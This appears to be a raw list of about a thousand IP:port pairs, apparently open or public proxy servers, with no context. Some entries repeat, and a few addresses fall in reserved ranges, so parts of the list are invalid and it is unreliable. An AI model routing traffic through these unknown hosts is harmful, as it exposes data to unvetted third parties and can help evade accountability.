192.144.30.1:8019
198.27.82.143:5426
110.238.111.229:21025
31.7.65.18:443
47.113.230.224:21242
200.111.232.94:8080
45.87.68.5:15321
65.109.152.88:8888
110.16.77.101:8082
212.33.238.17:8111
104.200.152.30:4145
60.188.102.225:18080
67.43.228.253:19239
192.111.138.29:4145
49.13.116.160:8888
67.43.228.253:7491
185.86.82.103:8080
104.236.171.128:41047
165.16.27.36:1976
207.180.208.185:21993
117.160.250.138:80
51.75.125.208:35497
118.69.134.0:80
114.236.93.203:15599
181.129.74.58:30431
207.180.198.241:31080
162.243.140.82:39009
103.148.77.156:16144
121.37.203.216:5000
36.255.86.115:84
181.81.245.194:4128
116.235.137.76:4145
128.199.221.91:35797
103.165.37.67:4153
62.171.165.23:31922
102.132.201.202:80
162.243.140.82:3871
147.135.129.229:47116
184.168.121.153:37735
103.176.45.87:3128
68.183.201.95:35275
186.195.33.22:5151
95.216.224.61:59792
103.154.160.50:80
186.96.96.134:999
37.32.98.160:42522
72.210.252.137:4145
64.27.10.80:32688
121.37.203.216:8989
109.123.254.43:24210
146.59.178.221:12438
223.112.53.2:1025
195.181.172.231:8081
178.32.73.29:60417
51.68.164.77:14297
213.108.127.130:8080
120.77.148.138:8080
143.198.41.48:16791
117.160.250.134:8899
79.101.106.74:33608
72.210.221.223:4145
212.92.204.54:80
192.252.211.197:14921
68.71.254.6:4145
200.108.242.105:80
50.235.247.114:8085
51.255.208.33:1991
51.38.50.249:9224
121.37.203.216:6789
5.189.184.147:59006
67.205.177.122:9551
190.14.38.1:8080
159.138.252.45:20000
195.223.43.252:8080
221.153.92.39:80
162.241.40.187:63114
189.91.85.133:31337
72.10.160.90:25835
49.7.11.187:80
199.102.104.70:4145
192.252.209.155:14455
209.121.164.50:31147
47.254.153.78:8003
41.93.63.66:8080
83.171.91.149:8080
137.220.61.75:62131
181.78.19.247:999
116.237.128.15:4145
149.202.237.183:30000
84.39.112.144:3128
89.187.157.180:8080
54.37.75.103:15150
101.200.187.233:139
198.12.253.60:57556
117.102.81.3:53281
37.1.196.8:80
179.106.9.241:8086
72.10.160.90:6841
188.87.102.128:3128
43.156.0.125:8888
104.238.111.107:7999
173.249.60.76:62047
14.103.24.20:8000
97.74.237.222:45219
117.74.65.29:45554
103.171.180.186:21725
72.195.34.42:4145
212.89.188.115:21231
161.132.125.244:8080
200.70.34.22:4153
67.205.177.122:6989
51.75.126.150:2663
45.76.152.253:65201
209.14.112.10:1080
190.4.58.22:8080
51.83.132.102:17609
98.162.25.7:31653
157.245.241.108:49853
159.203.137.249:13471
68.71.247.130:4145
68.71.247.130:4145
104.236.0.129:61469
142.54.236.97:4145
51.15.242.202:8888
146.190.84.209:1776
119.13.111.169:5678
162.241.46.6:64543
67.43.227.227:2779
67.43.228.252:11469
138.204.20.160:8080
78.140.195.66:3629
138.201.21.218:41331
92.205.61.38:61462
78.46.210.112:80
67.205.177.122:19177
146.59.93.138:80
162.241.46.6:57686
181.78.85.45:998
143.208.152.60:3180
8.219.97.248:80
167.172.238.15:10008
176.88.166.190:5678
67.43.227.227:22761
143.110.149.229:56118
113.223.212.82:8089
161.97.160.158:19815
124.160.118.183:8080
54.36.108.149:12412
181.212.41.171:999
116.202.235.157:63135
194.163.148.216:57460
103.107.84.122:2021
119.13.111.169:111
51.68.189.107:1080
82.209.165.206:4153
184.178.172.3:4145
162.241.41.87:59996
184.168.121.153:2752
54.37.244.208:7678
207.180.222.186:63961
27.76.105.253:5213
5.189.184.147:42956
117.160.250.134:80
47.98.134.232:50001
207.180.234.220:48712
51.158.64.130:16379
112.78.131.6:8080
188.132.222.140:8080
187.63.156.94:999
161.97.170.82:56427
47.91.56.120:55443
58.246.58.150:9002
91.121.163.199:31690
192.169.205.131:56657
138.197.92.54:10005
123.138.24.106:10467
72.210.221.223:4145
38.242.143.44:9840
129.151.87.50:80
163.172.131.178:16379
213.160.71.182:62558
43.132.128.186:24095
47.98.134.232:9091
141.147.9.254:80
209.14.112.8:1080
178.176.193.56:1080
49.0.250.196:8081
128.199.234.135:10965
113.137.37.41:1080
8.219.74.58:8002
163.172.171.22:16379
161.97.165.57:58958
72.10.164.178:17851
60.210.40.190:9091
167.99.236.14:80
141.94.174.6:60912
216.137.177.251:29465
85.107.251.64:8080
200.59.10.47:999
120.197.40.219:9002
123.138.24.108:11066
162.243.55.12:59179
207.180.222.186:46968
95.158.179.216:32799
117.74.65.207:514
89.40.227.114:58576
103.57.222.220:38097
75.112.64.27:8080
164.52.42.2:4145
164.132.163.73:48444
115.29.149.2:8000
162.241.52.206:36384
121.37.205.253:3000
45.64.96.154:4545
186.125.218.147:999
67.43.227.227:15491
103.49.28.23:12113
77.242.132.113:5678
185.23.118.103:63480
47.243.124.21:89
123.30.154.171:7777
47.106.107.212:3128
92.205.108.61:60558
8.209.255.13:3128
15.235.87.181:16006
178.79.165.164:3963
177.93.50.154:999
103.95.97.50:4153
161.97.173.42:54079
47.98.134.232:9002
184.178.172.11:4145
49.0.250.196:20002
142.54.228.193:4145
159.65.77.168:8585
192.111.139.162:4145
117.250.3.58:8080
66.27.58.70:8080
121.37.205.253:3127
72.37.217.3:4145
72.10.160.170:4563
51.75.126.150:39184
207.180.222.186:57599
117.160.250.133:80
208.113.167.209:1338
5.75.161.31:46918
103.85.102.10:82
192.111.137.37:18762
173.249.33.122:49382
203.19.38.114:1080
167.71.205.1:43998
107.180.92.12:54744
67.43.228.253:2955
88.213.214.254:4145
202.151.163.10:1080
72.10.173.196:8056
198.12.253.60:53946
74.119.147.209:4145
139.162.238.184:38787
98.170.57.231:4145
200.54.22.74:80
162.214.111.61:20082
195.66.156.196:1080
51.79.87.144:41746
98.178.72.21:10919
194.145.209.189:8083
47.92.247.250:59394
65.181.111.34:53997
104.37.135.145:4145
139.162.181.177:40882
162.215.223.71:31396
132.148.130.90:64264
67.43.236.20:25987
71.235.183.92:80
174.64.199.79:4145
138.99.176.26:999
104.219.234.42:10110
199.229.254.129:4145
104.238.111.107:5484
171.244.139.185:39453
167.71.41.191:37555
134.206.223.71:4145
192.111.139.163:19404
49.0.199.132:443
144.217.180.238:8888
37.195.222.7:52815
72.10.160.170:21459
139.162.238.184:54827
111.16.50.12:9002
112.51.96.118:9091
51.81.186.179:7026
177.190.189.16:44443
49.0.253.51:2019
115.29.149.2:19
72.167.222.102:9374
184.178.172.14:4145
67.213.212.50:54925
67.43.228.253:13859
124.70.221.252:8009
211.139.192.133:9002
183.230.162.122:9091
202.131.246.250:5678
184.181.217.210:4145
49.0.253.51:8060
103.48.68.29:83
49.0.199.132:111
49.235.127.178:8000
207.180.222.186:37067
104.200.135.46:4145
51.91.149.127:21801
80.92.227.185:5678
49.0.199.132:1337
124.70.221.252:8118
51.38.63.124:10983
95.217.241.119:3128
27.147.149.130:52596
47.243.92.199:3128
123.138.24.103:10400
142.54.229.249:4145
188.166.56.246:80
116.63.130.30:87
104.236.114.255:37342
67.43.227.227:1653
209.13.96.165:39921
207.180.222.186:24764
116.63.130.30:1111
47.245.34.161:8024
47.88.29.108:8090
109.194.22.61:8080
67.201.33.10:25283
51.83.47.200:3128
190.8.184.166:6900
198.199.86.11:8080
37.32.98.160:23444
181.209.78.75:999
49.0.253.51:18081
192.169.214.249:45108
43.153.11.204:20304
103.130.218.135:45751
67.205.177.122:18981
119.39.68.118:2323
51.255.79.114:53160
159.138.122.91:18080
162.241.44.32:36384
184.178.172.14:4145
192.111.137.37:18762
142.4.8.81:63236
128.199.234.135:26776
72.217.158.202:4145
138.68.16.30:13469
138.197.92.54:10000
190.120.249.60:999
38.56.70.218:999
54.39.159.23:14428
161.97.170.209:49363
67.43.236.20:7965
117.242.232.86:9829
213.19.205.18:54321
112.78.39.94:4153
192.111.139.162:4145
2.189.59.5:80
34.64.85.78:3128
182.106.220.252:9091
147.182.140.176:4136
60.12.168.114:9002
192.252.208.70:14282
45.128.133.199:1080
94.23.222.122:53066
142.54.231.38:4145
198.199.76.62:26592
103.167.85.135:40754
218.57.210.186:9002
8.222.152.158:5556
185.151.86.121:3699
161.97.163.52:57480
162.214.164.200:50972
213.251.185.168:46175
51.83.132.102:47430
103.148.57.103:30010
173.249.33.122:47366
47.243.50.83:9992
120.46.197.14:1337
47.243.50.83:1234
47.243.50.83:41
192.111.135.17:18302
181.102.183.84:1080
208.109.14.49:4028
161.97.174.224:2935
207.31.109.77:52688
104.131.77.66:2233
51.75.126.150:3950
222.127.77.167:8082
208.102.51.6:58208
51.83.132.102:21841
184.181.217.206:4145
192.252.214.20:15864
137.220.61.75:49836
36.89.85.249:5678
72.10.164.178:28987
213.32.252.134:5678
162.240.49.196:14237
103.247.22.164:8080
249.45.186.60:3128
184.107.90.26:3128
184.178.172.17:4145
162.215.213.134:30866
121.40.62.167:3128
193.216.224.108:8192
192.163.201.131:21487
178.79.165.164:36787
37.44.238.2:57167
192.163.202.88:61323
137.184.1.49:25601
177.101.0.199:8080
47.113.230.224:4006
198.199.76.62:26592
184.178.172.11:4145
103.162.31.38:49935
51.83.132.102:18354
185.43.249.148:39316
62.171.131.101:36187
192.111.130.5:17002
159.223.183.111:80
212.83.137.142:15282
194.163.162.123:9725
95.51.119.81:2829
212.31.100.138:4153
61.133.66.69:9002
120.46.215.52:9091
88.202.230.103:10198
194.163.160.203:14447
51.75.126.150:12919
167.99.39.82:46015
147.135.129.229:7701
192.111.137.35:4145
37.221.193.221:25231
216.169.73.65:34679
121.37.203.216:8889
182.23.79.162:50862
174.64.199.79:4145
213.136.75.85:57799
103.133.223.211:2525
178.128.82.105:2706
190.217.20.106:999
162.214.170.144:17117
84.52.123.163:4145
177.38.72.38:9292
139.59.80.125:17192
117.74.65.207:51053
47.92.242.45:3000
184.181.217.210:4145
190.2.211.146:999
166.62.122.168:40792
148.72.211.168:27013
209.126.9.164:26246
108.181.23.19:46741
134.122.5.111:9601
199.187.210.54:4145
212.110.188.216:34405
45.7.24.102:3128
184.178.172.18:15280
207.180.222.186:17182
173.249.33.122:42874
91.121.163.199:3385
183.89.116.177:8080
192.252.216.81:4145
159.203.137.249:13471
144.91.66.30:31498
89.58.45.94:37140
170.80.203.40:999
47.92.242.45:8181
199.58.185.9:4145
68.183.140.104:36791
188.165.226.128:59307
91.98.33.89:8080
72.210.252.134:46164
72.195.34.59:4145
117.74.65.207:51200
184.168.120.69:52350
200.125.169.118:999
134.19.254.2:4153
31.223.25.236:808
94.74.80.88:4153
172.93.111.235:1659
160.248.80.91:443
91.126.217.67:8829
94.74.80.88:85
38.156.234.201:999
208.109.13.93:39474
38.50.130.93:5678
117.74.65.207:54877
47.252.20.42:8009
74.119.147.209:4145
67.205.177.122:29880
50.63.12.101:47967
192.111.137.34:18765
171.248.221.204:1080
123.138.24.108:10961
184.178.172.18:15280
47.252.20.42:9091
79.137.34.146:53590
184.178.172.23:4145
51.83.132.102:47430
47.253.214.60:8118
2.189.59.2:80
47.91.65.23:3128
47.252.20.42:80
120.234.203.171:9002
198.8.94.170:4145
72.10.164.178:12889
103.152.112.145:80
203.142.77.226:8080
159.138.252.45:8080
51.255.79.114:38643
188.164.194.117:17494
139.196.214.238:5678
184.170.245.148:4145
47.252.20.42:20002
174.77.111.197:4145
195.181.172.230:8081
84.204.40.156:8080
67.43.236.20:14003
116.63.130.30:6789
47.243.242.70:8084
167.86.99.163:57842
222.124.135.123:5678
139.196.214.238:3129
159.203.63.113:33436
162.215.222.207:51066
98.162.25.16:4145
207.180.222.186:21067
13.212.99.37:8888
213.79.104.233:8080
92.205.108.61:53346
37.44.238.2:57167
120.46.215.52:10000
192.163.202.88:61323
47.243.242.70:4145
117.250.3.58:8080
166.62.87.148:39365
201.93.159.234:4145
172.105.157.94:43618
109.123.253.20:62503
109.205.181.27:20357
198.8.94.170:4145
184.178.172.23:4145
192.111.137.34:18765
162.19.7.58:29859
119.235.50.5:4145
72.210.252.137:4145
132.148.154.97:5863
46.101.99.250:23424
184.170.249.65:4145
121.37.199.23:8058
198.12.253.60:54908
49.0.199.132:8888
172.93.110.144:14420
175.6.103.17:1080
182.16.171.42:51459
45.91.93.166:20515
141.94.174.6:47913
213.136.78.200:1596
199.102.105.242:4145
8.209.253.237:8095
162.241.115.85:60030
81.169.254.66:23639
188.164.194.117:17494
184.170.248.5:4145
185.87.121.35:8975
198.12.251.108:56459
188.165.239.102:34592
210.211.122.40:49591
139.162.238.184:38787
47.243.175.55:808
184.168.121.153:17579
161.97.174.224:10928
109.201.152.163:1080
162.241.6.97:31263
207.180.226.58:62370
94.23.222.122:16343
159.203.63.113:33436
213.136.79.177:31501
194.1.232.150:33333
178.32.73.29:36076
207.180.222.186:37871
141.94.174.6:46774
8.210.37.63:8060
173.249.33.122:64873
85.208.117.214:20037
147.182.195.54:2131
142.54.226.214:4145
5.45.73.25:5203
114.4.200.222:5678
103.164.106.98:5678
109.123.253.20:57682
39.104.79.145:8088
72.206.181.97:64943
23.108.64.77:8118
51.195.137.62:4404
121.40.115.140:9999
72.10.164.178:6015
47.245.34.161:1111
198.12.253.239:19390
207.180.235.153:54423
185.215.53.201:3629
103.105.79.69:1080
38.242.238.254:43113
192.111.134.10:4145
184.168.121.153:37735
121.37.207.154:8083
162.243.84.187:5240
165.227.196.37:60281
66.42.224.229:41679
145.239.2.102:37286
207.180.240.147:25492
162.240.22.169:43439
8.208.90.243:4145
78.128.8.156:34369
51.38.50.249:9224
198.12.253.117:40091
51.161.33.206:47058
72.206.181.97:64943
158.51.210.75:7777
107.181.161.81:4145
42.200.196.208:8080
43.230.196.98:48200
177.234.249.218:4153
144.202.45.78:29452
172.96.140.93:4049
104.236.114.255:9900
207.180.222.186:60941
192.111.135.17:18302
103.229.53.83:3128
109.238.12.156:6511
137.66.45.118:3389
164.92.109.53:51263
85.28.63.212:64039
138.199.25.13:3901
98.162.25.7:31653
51.161.99.114:29758
213.136.75.85:57607
98.162.25.29:31679
148.72.213.202:46569
198.57.195.42:17986
213.136.78.200:51240
205.196.217.229:23171
47.109.53.253:10001
162.214.188.67:48368
117.74.65.207:50468
173.249.33.122:37536
103.161.17.11:7160
141.94.174.6:60896
207.180.208.185:53142
154.66.109.41:10081
209.159.155.20:54993
123.60.109.71:52869
95.179.192.54:3128
104.37.135.145:4145
171.221.240.17:10800
94.23.83.53:14510
184.168.121.153:13658
220.247.164.11:9990
173.249.31.25:63959
184.181.217.213:4145
208.109.14.49:10567
162.241.46.40:64543
162.241.40.187:63114
69.61.200.104:36181
51.89.173.40:3100
8.213.129.20:90
112.78.138.163:5678
202.180.20.114:1080
89.185.29.2:80
193.239.56.84:8081
143.198.229.56:56820
103.169.187.164:8086
162.214.227.68:52350
202.148.31.222:8080
86.63.140.160:3128
162.214.225.223:62079
103.174.236.63:10801
196.51.85.136:8800
74.119.144.60:4145
92.114.19.135:3128
38.6.153.23:9000
51.15.212.207:16379
179.40.75.1:61362
202.149.67.18:7999
98.170.57.249:4145
103.106.78.187:8282
162.144.83.73:55735
199.102.106.94:4145
41.65.224.93:1981
162.144.36.208:52074
41.78.38.245:45318
189.240.60.163:9090
195.14.26.9:1080
103.154.77.75:8080
103.130.4.8:8080
133.232.90.126:80
79.137.34.146:31718
195.117.148.69:41258
188.125.173.66:8080
181.209.82.154:14888
111.72.200.211:8089
134.99.89.31:3128
194.124.36.98:8080
191.242.126.249:4145
125.87.93.33:8089
125.87.91.179:8089
114.103.80.134:8089
38.172.128.208:999
109.94.182.9:4145
113.176.95.208:8080
186.250.25.230:55443
34.27.110.163:3128
185.46.170.253:4145
180.178.98.91:2526
162.248.225.184:80
162.248.225.124:80
190.147.183.27:8080
103.149.56.98:80
202.68.182.4:8085
5.149.81.90:8080
45.174.46.74:999
103.153.154.6:80
5.161.212.254:3128
5.161.121.221:3128
37.148.211.88:3128
161.97.163.52:9583
190.122.185.170:999
101.109.107.154:8080
185.249.107.84:3128
103.247.82.2:8080
103.8.164.16:1111
69.167.170.149:58590
216.73.158.116:30751
114.231.82.60:8089
186.148.182.86:999
115.75.99.65:4153
103.231.249.242:3128
217.12.21.249:80
103.134.38.89:5678
5.161.180.12:3128
103.240.8.230:3128
101.108.125.146:8080
189.240.60.168:9090
114.231.46.20:8089
114.231.82.17:8888
102.132.56.218:8080
204.188.210.198:4128
31.186.136.15:3128
27.79.199.186:3128
182.253.40.51:8088
163.53.82.237:32650
38.156.238.181:999
103.234.27.221:9990
192.252.208.70:14282
132.148.152.178:45759
142.65.131.140:8081
47.92.242.45:7890
117.187.18.136:3128
185.131.62.6:4153
45.188.167.228:999
117.69.147.192:38801
102.68.131.31:8080
119.6.239.22:80
45.133.168.120:8080
8.213.128.90:8888
115.127.110.218:9990
2.187.186.67:8080
62.173.37.202:8080
38.51.235.214:999
137.220.61.212:30847
50.197.210.138:32100
194.124.37.9:8080
196.212.116.92:4097
45.71.115.65:999
116.204.182.155:43050
91.235.220.122:80
200.39.152.193:999
142.54.239.1:4145
180.242.248.99:8080
102.216.181.6:8080
1.224.3.122:3889
150.95.31.102:7777
119.46.2.242:4145
43.136.233.225:7891
132.145.162.109:3128
95.164.84.68:3128
202.144.139.201:8080
103.23.37.138:80
92.114.19.131:3128
92.114.19.138:3128
69.167.170.149:58590
92.114.19.133:3128
192.111.138.29:4145
185.72.58.155:5678
8.213.129.20:8002
8.219.229.248:15673
148.72.177.80:6038
154.53.49.83:10212
154.53.49.83:11289
119.15.171.166:65205
129.18.164.130:8080
108.181.172.80:1981
5.180.254.9:80
192.111.130.2:4145
223.215.176.120:8089
196.11.183.216:8080
103.135.135.197:34432
45.7.64.49:999
103.105.196.130:3128
194.47.228.181:80
208.65.90.21:4145
41.33.66.238:1981
173.236.170.37:12952
186.13.11.121:8080
102.217.8.1:5678
189.230.87.174:999
23.131.56.171:999
142.54.231.38:4145
103.226.232.185:3125
193.150.21.138:8088
141.105.141.83:18
85.214.251.15:3128
199.188.89.231:9000
5.161.111.42:3128
199.120.124.30:80
103.121.39.82:1080
103.156.17.151:8080
91.67.240.32:3128
103.118.175.232:1080
103.231.78.36:80
185.134.99.62:4153
46.188.34.52:1080
5.188.191.200:11047
116.254.115.130:8080
181.176.148.138:999
89.41.106.8:4145
184.178.172.28:15294
185.221.237.219:80
103.89.56.234:18
187.134.45.164:8080
131.0.246.113:4153
163.53.82.238:32650
180.242.248.70:8080
45.247.64.49:8080
103.178.94.107:80
164.40.194.76:8080
210.21.63.141:8080
177.241.233.10:999
117.74.125.61:1133
154.113.172.58:5678
185.142.142.31:3128
202.154.18.9:8080
114.231.82.102:8089
91.225.109.186:46436
103.147.241.3:8181
103.121.39.82:1080
121.45.158.222:8080
197.10.250.239:80
31.210.172.11:3128
103.76.15.202:5678
14.102.20.53:5678
143.47.121.145:3128
180.180.77.50:8080
177.200.239.46:999
46.21.250.131:36168
181.78.95.48:999
45.224.20.69:999
38.7.197.192:999
179.108.158.204:4145
50.250.75.153:39593
189.127.128.248:8080
115.127.19.193:8674
103.216.49.57:8080
38.156.74.9:8080
109.254.81.159:9090
91.67.234.73:80
170.83.242.250:999
196.251.135.157:8080
103.253.127.186:8080
24.152.50.116:999
34.125.67.181:50720
102.132.40.222:8080
190.94.212.4:999
190.94.212.197:999
190.94.239.182:8080
51.83.184.241:9191
45.127.222.25:33333
102.132.41.31:8080
45.231.29.75:4153
162.241.158.204:41538
41.190.232.52:36926
170.246.85.109:37163
38.56.80.23:3125
209.59.138.30:54733
75.149.129.42:37807
46.35.93.242:8080
102.215.65.250:5678
79.106.34.6:4145
45.225.207.180:999
188.255.244.145:1080
181.209.125.186:999
59.60.208.19:8089
116.96.16.56:1080
216.238.99.171:80
178.152.24.98:8080
103.133.221.251:80
192.111.129.145:16894
223.165.243.161:47205
122.116.150.2:9000
177.200.239.40:999
95.216.164.36:80
24.249.199.12:4145
222.165.234.147:52667
170.187.226.142:3128
125.25.33.78:8080
186.4.147.10:8080
113.121.37.164:9999
94.130.54.171:7385
94.130.54.171:7449
94.130.54.171:7455
94.130.54.171:7166
94.130.54.171:7396
94.130.54.171:7021
206.233.177.254:80
37.156.104.174:1080
115.29.148.215:9090
23.94.41.236:8081
194.182.187.78:3128
190.104.168.19:80
91.98.12.161:33333
115.203.62.204:808
190.72.102.42:999
103.141.70.18:8080
188.215.245.235:80
94.130.54.171:7293
94.130.54.171:7125
94.130.54.171:7095
117.196.239.196:4145
190.110.35.224:999
103.118.175.87:1645
45.128.133.65:1080
31.59.9.32:8080
179.1.129.37:999
186.148.181.50:8080
115.242.204.122:5678
170.83.242.251:999
14.161.24.81:2022
45.81.145.128:8080
45.252.79.48:8080
196.51.181.154:8800
103.234.27.158:1080
210.245.51.76:4145
139.196.214.238:8024
193.31.119.180:48677
103.234.27.164:1080
103.234.27.78:9090
142.93.218.24:3128
186.230.214.5:80
58.250.250.115:8888
193.233.203.58:3128
45.184.85.18:999
46.229.55.37:9050
121.230.210.254:8089
31.214.171.62:3128
190.97.233.18:999
186.30.116.46:999
1.2.169.39:50832
95.128.142.76:1080
105.234.148.210:35010
175.101.80.134:8080
131.186.39.149:3128
190.57.131.158:1080
45.250.169.132:8080
197.156.243.134:33333
45.118.218.196:35010
114.106.135.0:8089
47.113.224.182:8889
38.44.237.230:999
114.226.31.226:1080
103.88.237.24:8080
65.21.232.59:8786
104.164.183.173:3128
223.247.46.96:8089
119.110.73.226:3888
114.226.31.226:1080
198.13.42.153:3129
5.161.82.73:3128
179.53.239.155:3128
210.56.2.106:8080
84.201.254.47:3128
179.0.43.68:999
183.166.171.35:41122
41.77.210.210:80
69.70.244.34:80
45.71.169.145:80
103.205.130.42:4145
141.94.254.138:49207
45.190.141.241:1080
103.83.232.122:80
103.160.205.254:8080
208.72.108.226:16088
103.234.27.78:1080
138.68.24.185:12222
179.1.85.210:999
124.158.182.34:10808
142.54.226.214:4145
93.190.142.194:49002
228.231.104.101:80
38.52.162.255:999
202.173.220.50:1122
138.59.20.42:9999
222.190.173.154:8089
192.111.130.2:4145
103.218.188.2:80
69.61.200.104:36181
114.231.46.185:8089
163.53.204.178:9813
213.252.245.221:6116
23.143.160.7:999
186.103.143.213:4153
80.82.222.61:3128
88.99.249.96:8283
51.77.141.29:30994
103.48.68.107:83
204.157.240.53:999
117.74.125.49:1133
114.106.135.177:8089
115.127.88.138:8674
200.125.168.132:999
88.99.249.96:8177
129.213.118.148:3128
194.31.53.250:80
68.1.210.189:4145
24.249.199.4:4145
45.229.6.81:999
121.206.205.69:4134
192.252.208.67:14287
177.66.43.189:4145
180.119.92.64:8089
117.94.122.150:9000
190.103.84.11:32767
61.7.146.7:80
61.184.189.124:10800
142.54.239.1:4145
66.154.14.53:50819
72.37.216.68:4145
47.88.29.108:9090
68.1.210.163:4145
72.221.171.130:4145
5.165.6.188:1513
114.233.70.184:9000
103.38.103.18:1080
128.199.107.14:51124
103.167.71.38:8080
41.220.135.105:8040
103.124.139.178:4145
188.136.154.52:7060
67.225.243.221:63536
103.105.76.217:8080
202.0.103.115:80
180.189.196.167:8080
91.108.132.142:8080
170.39.30.129:8080
46.148.36.47:4153
153.127.248.65:8080
181.115.93.77:999
202.154.19.195:8082
162.240.212.81:45410
177.93.45.154:999
50.238.47.86:32100
67.227.213.99:56510
88.99.249.96:8255
221.230.216.50:7788
103.162.199.41:8080
134.35.6.112:8080
123.245.248.135:8089
93.123.16.188:3128
203.89.29.85:6060
138.117.77.214:999
109.201.14.82:8080
136.243.20.45:14195
103.161.164.125:8181
193.200.151.69:32777
158.140.169.86:80
184.170.245.148:4145
203.89.29.41:6060
190.104.173.62:80
179.53.250.19:3128
103.83.252.61:1080
168.228.36.22:27234
223.215.176.221:8089
31.170.19.241:4153
94.20.21.9:4153
203.171.110.218:8080
92.63.168.248:80
8.39.228.21:39593
154.0.157.10:8080
170.254.244.107:35010
81.10.80.155:8080
128.199.202.122:8080
144.91.78.34:49368
185.49.170.20:43626
5.161.207.168:3128
98.162.96.52:4145
220.247.225.132:8080
114.231.42.104:8089
177.38.10.15:8080
120.79.34.201:9992
114.103.81.34:8089
5.2.228.168:8888
101.34.30.200:8081
114.233.70.213:9000
91.197.77.118:443
45.133.168.168:8080
181.191.39.29:5678
1.9.213.114:4153
190.93.178.205:999
167.172.137.99:33080
103.146.184.19:1085
174.75.211.222:4145
43.239.75.102:4145
36.92.162.212:8080
129.151.204.192:8080
103.72.198.132:82
184.178.172.26:4145
220.201.84.24:9999
36.67.208.60:80
41.65.236.43:1981
210.213.212.121:8080
45.5.118.43:999
45.5.118.142:8080
110.34.3.229:3128
103.178.42.14:8181
94.102.203.2:1500
103.155.54.137:83
179.107.54.27:5566
2.83.198.171:80
85.114.120.177:9999
200.32.105.86:4153
45.32.94.106:11968
45.32.89.242:11808
103.160.17.38:5678
102.70.160.211:8081
177.234.210.56:999
79.127.11.194:8080
200.109.66.90:4153
103.139.144.105:8080
103.123.168.165:83
103.150.18.218:80
111.255.251.59:3129
41.203.192.238:53281
149.28.247.196:10400
199.192.69.36:3128
192.141.196.129:8080
102.135.148.79:12354
78.47.186.43:6666
200.106.184.21:999
170.81.108.45:4153
45.189.113.142:999
103.149.194.24:32650
103.137.198.5:8080
177.22.115.97:8089
72.210.252.134:46164
103.79.35.26:34525
103.156.141.100:8010
187.102.219.149:999
212.23.217.71:8080
179.0.43.45:999
203.192.217.11:8080
27.118.21.13:5678
71.40.17.29:33651
72.49.49.11:31034
222.190.208.125:8089
66.29.129.54:21925
221.230.216.54:7788
77.43.205.52:7788
201.77.108.149:999
200.106.187.252:999
103.191.155.30:8080
222.190.208.44:8089
182.48.204.35:8080
162.212.157.35:8080
115.127.122.100:8080
115.127.87.62:1088
115.127.79.234:8080
115.127.75.154:1088
115.124.69.166:3128
103.93.100.78:32000
103.48.183.113:4145
103.138.22.165:32000
118.70.12.171:53281
103.167.171.150:8181
103.122.64.208:9090
103.210.35.103:443
45.70.236.192:999
177.53.214.208:999
190.119.167.154:5678
46.34.174.239:8090
104.200.135.46:4145
41.74.91.190:7777
95.158.174.111:8080
184.178.172.25:15291
103.244.205.179:8888
78.107.228.38:7954
98.181.137.80:4145
185.86.82.74:8080
103.91.95.2:32767
45.188.108.65:8080
190.90.8.74:8080
119.46.2.250:4145
103.134.113.247:32767
103.49.202.252:80
114.103.88.116:8089
185.134.96.34:8081
77.46.134.115:5678
110.44.171.10:57775
1.10.186.107:13629
103.180.113.217:8080
95.170.202.197:58744
103.112.22.81:83
157.245.27.9:3128
85.50.139.97:55443
103.48.68.36:82
41.65.236.57:1976
46.172.75.51:5678
41.65.236.35:1981
41.58.169.214:5678
162.212.157.238:8080
162.212.153.95:8080
190.186.216.196:5678
117.74.65.29:1311
51.38.238.251:6753
103.235.199.100:25566
58.143.65.69:22569
179.43.8.15:8084
125.126.213.4:38801
103.159.90.6:8080
36.83.188.44:8080
197.234.58.102:57775
103.4.167.69:8080
103.48.68.35:83
177.93.37.84:999
45.117.228.81:4145
186.145.192.251:5678
198.44.191.143:45787
131.100.48.97:999
109.94.178.238:3629
103.250.153.202:41889
45.224.119.184:999
46.105.105.223:45443
138.122.74.55:57775
200.7.10.158:8080
200.60.71.12:46934
103.167.172.104:57775
183.111.165.166:14
159.65.9.135:10277
159.65.9.135:10999
146.196.121.29:57775
187.1.57.206:20183
47.109.46.223:8090
117.74.65.29:8012
142.54.235.9:4145
198.8.84.3:4145
199.102.107.145:4145
107.152.98.5:4145
199.102.106.94:4145
43.133.180.107:7890
45.190.170.254:999
202.146.228.252:8088
103.159.46.34:84
117.74.65.207:8017
131.100.51.110:13
41.65.236.53:1981
190.217.101.73:999
94.231.178.249:9797
103.79.165.164:57775
89.116.225.216:3128
117.54.114.100:80
159.138.252.45:8081
181.39.35.3:999
115.29.140.201:9443
193.106.192.50:36387
179.56.178.3:999
103.118.175.71:3127
154.0.155.205:8080
202.154.18.115:1080
37.32.12.216:4008
117.54.114.99:80
177.234.244.170:32213
72.49.49.11:31034
177.234.244.171:999
45.174.240.94:999
5.78.90.243:8080
186.101.84.214:999
170.245.132.86:999
103.209.64.19:6667
103.127.1.130:80
103.168.233.91:25566
45.130.96.26:8080
103.149.104.161:4153
223.215.177.196:8089
63.42.112.155:8001
170.254.148.110:8080
159.138.255.141:9981
79.122.244.99:3128
114.233.71.0:9000
34.86.252.79:8585
34.162.24.17:8585
34.86.196.77:8585
34.86.64.245:8585
34.162.183.32:8585
34.162.76.11:8585
35.193.158.6:8585
34.162.59.88:8585
114.231.8.204:8089
34.162.63.141:8585
34.162.67.130:8585
183.165.246.108:8089
34.162.171.228:8585
223.247.46.169:8089
34.85.211.38:8585
34.86.138.63:8585
34.162.135.2:8585
34.174.141.41:8585
34.162.156.215:8585
3.96.55.112:3128
34.85.155.119:8585
34.162.53.144:8585
34.162.22.200:8585
35.245.31.182:8585
180.183.230.16:8080
49.70.89.82:9999
131.158.255.210:4145
42.249.191.56:3256
103.78.105.85:8989
102.68.128.217:8080
200.106.184.12:999
66.29.154.103:3128
95.158.174.111:1080
49.70.89.246:8089
103.18.232.47:80
202.57.37.197:35846
43.229.73.239:41862
193.141.65.48:808
41.190.152.130:4673
46.160.209.155:8088
201.238.248.134:443
193.141.65.48:1080
187.62.64.155:45005
87.123.56.163:80
79.173.75.182:3629
46.34.189.149:8090
181.225.107.227:999
200.82.188.28:999
190.186.159.17:999
103.146.17.241:80
222.190.208.233:8089
114.103.88.53:8089
117.70.48.40:8089
114.99.8.124:8089
41.57.34.112:1080
110.78.149.70:4145
103.169.53.87:8080
178.216.249.130:8080
45.225.185.62:999
31.131.135.247:4153
5.133.96.148:4153
198.44.191.202:45787
177.66.101.223:8024
103.152.104.228:1080
103.15.140.121:44759
45.184.155.6:999
45.184.155.3:999
190.186.18.161:999
80.250.18.225:25566
123.245.248.97:8089
41.215.85.74:8080
190.114.143.226:8080
